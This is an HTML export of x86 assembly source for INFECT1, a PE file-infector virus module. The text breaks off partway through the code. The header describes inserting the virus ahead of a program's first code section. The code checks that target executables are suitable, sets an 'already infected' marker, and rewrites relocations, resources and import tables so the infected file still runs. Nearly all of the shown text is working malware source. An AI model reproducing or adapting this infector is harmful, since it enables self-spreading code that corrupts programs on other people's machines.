<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; INFECT1</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~</span><span class="sc0">
</span><span class="sc1">; - first-section in-memory file infector</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     OLD FILE:         NEW FILE:               Infection Method:</span><span class="sc0">
</span><span class="sc1">;   (PE exe/dll)                                ~~~~~~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ MZ-header    ³  ³ MZ-header    ³   ş 2nd part of file (from CODE section)</span><span class="sc0">
</span><span class="sc1">; ³ PE-header    ³  ³ PE-header    ³     is displaced down</span><span class="sc0">
</span><span class="sc1">; ³ object table ³  ³ object table ³  Úş virus is inserted into file between</span><span class="sc0">
</span><span class="sc1">; ÃÄ.CODEÄÄÄÄÄÄÄÄ´  ÃÄ.CODEÄÄÄÄÄÄÄÄ´  ³    end-of-headers and first section</span><span class="sc0">
</span><span class="sc1">; ³ [CODE]       ³¿ ³ [VIRUS]      ³Ä´ş file to infect must have relocations</span><span class="sc0">
</span><span class="sc1">; ³ old_entry:   ³³ ³ new_entry:   ³Ä´ş all relocations within all the file</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´³ ³ jmp old_entry³ÄÙ    are modified</span><span class="sc0">
</span><span class="sc1">; ³ .DATA, ...   ³³ Ã- - - - - - - ´   ş PE hdr &amp; .reloc section are modified</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÀ³ [CODE]       ³   ş resources (.rsrc), imports/exports</span><span class="sc0">
</span><span class="sc1">;                   ³ old_entry:   ³       are modified if present</span><span class="sc0">
</span><span class="sc1">;                   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ş all file io using FileMapping</span><span class="sc0">
</span><span class="sc1">;                   ³ .DATA, ...   ³   ş datetime/file attribs are preserved,</span><span class="sc0">
</span><span class="sc1">;                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ     except time is increased by 2 sec.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">consts.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">mz.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">pe.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">infmanx.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">loader.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">pervert.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">selfcorr.inc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">plugin.inc</span><span class="sc0">
                        </span><span class="sc5">PLUGIN_START</span><span class="sc0">    </span><span class="sc5">INFECT1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CODE32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PERMUTABLE</span><span class="sc0">

</span><span class="sc5">handleevent</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">hookevent</span><span class="sc0"> </span><span class="sc5">EV_INFMANX_INFECTINMEM</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">infcaller</span><span class="sc0">
                        </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">infcaller</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file_in_memory</span><span class="sc0">

                        </span><span class="sc5">SKIPLOADER</span><span class="sc0">              </span><span class="sc1">; 'coz need to return CF</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; subroutine: infect_file_in_memory</span><span class="sc0">
</span><span class="sc1">; input:      on the stack</span><span class="sc0">
</span><span class="sc1">; output:     CF=0  -- file infected, EAX = new file size</span><span class="sc0">
</span><span class="sc1">;             CF=1  -- alredy infected or an error occured</span><span class="sc0">

</span><span class="sc5">infect_file_in_memory</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">

                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">_vir_old_eip</span><span class="sc0">      </span><span class="sc1">; old eip ptr (rel2_vir_start)</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">_vir_entry</span><span class="sc0">        </span><span class="sc1">; vir entry (rel2_vir_start)</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">_vir_size</span><span class="sc0">         </span><span class="sc1">; vir size</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">_vir_start</span><span class="sc0">        </span><span class="sc1">; vir start</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">_size</span><span class="sc0">             </span><span class="sc1">; *size</span><span class="sc0">
                        </span><span class="sc5">arg</span><span class="sc0">     </span><span class="sc5">_fileptr</span><span class="sc0">          </span><span class="sc1">; *data</span><span class="sc0">

                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">_vir_size_aligned</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">_objtableptr</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">_resourcebase</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">_orig_size</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">_lastoeptr</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_fileptr</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.mz_neptr</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_size</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__error</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'EP'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__error</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_exeflags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">  </span><span class="sc1">; no_relocs?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__error</span><span class="sc0">

</span><span class="sc1">; calculate object table offset</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_ntheadersize</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_objtableptr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; phys size == real size ?   -- check overlay</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_numofobjects</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_lastoeptr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_phys_offs</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_size</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; abs(eax)</span><span class="sc0">
                        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_filealign</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__error</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_entrypointrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__error</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_importtablerva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__error</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_numofobjects</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; min 2 sections</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__error</span><span class="sc0">

</span><span class="sc1">; *** 'alredy-infected?'-check is here ***</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_linkminor</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__error</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_linkminor</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">

</span><span class="sc1">;;;; very, very important command! use it to avoid usage of "bound imports"</span><span class="sc0">
</span><span class="sc1">;;;; i.e. if some NOT infected file uses direct addresses from the current</span><span class="sc0">
</span><span class="sc1">;;;; infected DLL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_datetime</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;;;;</span><span class="sc0">

</span><span class="sc1">; selfcorr: increase virsize</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_orig_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc5">eventX</span><span class="sc0">  </span><span class="sc5">EV_SELFCORR_CSUM_GET_SIZE</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__nsc1</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">_vir_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__nsc1</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc1">; calculate file-and-object-aligned _vir_size</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_filealign</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_objectalign</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_vir_size_aligned</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; infecting. WARNING: after any modification, no way to 'Jxx __error' there</span><span class="sc0">

</span><span class="sc1">; call pervertor (if present)</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_entrypointrva</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc5">eventX</span><span class="sc0">  </span><span class="sc5">EV_INFECT1_AT_ENTRY</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; fix resources (.rsrc) if present</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_resourcetablerva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__skipfixres</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_resourcetablerva</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">_resourcebase</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__fix_rsrc</span><span class="sc0">
</span><span class="sc5">__skipfixres</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; fix relocs</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_fixuptablerva</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_fixuptablesize</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">__rel_cycle</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">__rel_fix</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__rel_end</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__rel_skip</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFh</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__rel_skip</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__rel_fix</span><span class="sc0">
</span><span class="sc5">__rel_end</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">  </span><span class="sc1">; fix page rva</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__rel_cycle</span><span class="sc0">

</span><span class="sc1">; fix import table</span><span class="sc0">

</span><span class="sc1">;+00  dd  im_lookup1-IMAGEBASE  ; im_lookuprva</span><span class="sc0">
</span><span class="sc1">;+04  dd  ?                     ; im_datetime</span><span class="sc0">
</span><span class="sc1">;+08  dd  -1                    ; im_forwardchain</span><span class="sc0">
</span><span class="sc1">;+0C  dd  im_nam1-IMAGEBASE     ; im_namerva</span><span class="sc0">
</span><span class="sc1">;+10  dd  im_tbl1-IMAGEBASE     ; im_addresstablerva</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.pe_importtablerva</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__skipfiximp</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__virt2phys</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vir_size_aligned</span><span class="sc0">

</span><span class="sc5">__imp_cycle</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__imp_exit</span><span class="sc0">

                        </span><span class="sc1">; make 'unbound' imports</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; datetime = 0</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__imp1_fixtbl_v2</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
